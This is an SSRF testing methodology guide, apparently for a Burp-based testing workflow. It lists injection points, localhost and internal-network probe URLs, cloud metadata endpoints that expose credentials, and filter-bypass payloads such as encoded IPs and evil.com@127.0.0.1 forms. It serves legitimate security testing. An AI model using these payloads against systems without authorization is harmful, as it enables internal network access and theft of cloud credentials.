# SSRF Detection

## Objective

Detect SSRF vulnerabilities that allow forcing the server to make requests to internal or external resources.

## Typical injection points

- URL parameters: `?url=`, `?uri=`, `?path=`, `?dest=`, `?redirect=`
- Features: URL import, Webhooks, Link previews
- Headers: `X-Forwarded-Host`, `Host`
- Files: PDF generation, Image processing

## Test steps

### 1. Identify suspicious features

Look for:
- Fields accepting URLs
- Fetch/preview functions
- Webhook integrations
- External data imports

### 2. Test with a controlled external server

```
https://your-burp-collaborator.oastify.com
https://webhook.site/your-id
http://your-ip:port
```

### 3. Test internal access

**Localhost:**
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://127.0.0.1:22
http://127.0.0.1:3306
```

**Internal network:**
```
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
http://169.254.169.254  (Cloud metadata)
```

**Cloud metadata services:**
```
-- AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

-- GCP
http://metadata.google.internal/computeMetadata/v1/

-- Azure
http://169.254.169.254/metadata/instance
```

### 4. Bypasses

**URL encoding:**
```
http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31
```

**Decimal notation:**
```
http://127.0.0.1 -> http://2130706433
```

**Redirection:**
```
https://your-site.com/redirect?url=http://127.0.0.1
```

**DNS rebinding:**
```
Domain configured to resolve to 127.0.0.1
```

**Validation bypass:**
```
http://evil.com@127.0.0.1
http://127.0.0.1.evil.com
http://127.0.0.1#@evil.com
```

### 5. Document the finding

If vulnerable:
```
1. burp_cvss_calculate(...) to get the vector
2. burp_create_finding(
     title: "SSRF on [endpoint]",
     cvss_vector: "<from calculator>",
     description: "...",
     references: ["CWE-918"]
   )
```

## Vulnerability indicators

- Different response for internal vs external URLs
- Variable response time depending on target
- Errors revealing connections
- Internal resource content in response

## Potential impacts

- Internal network scanning
- Cloud metadata access (credentials)
- Firewall bypass
- Access to internal services (Redis, Memcached, etc.)
- RCE in some cases
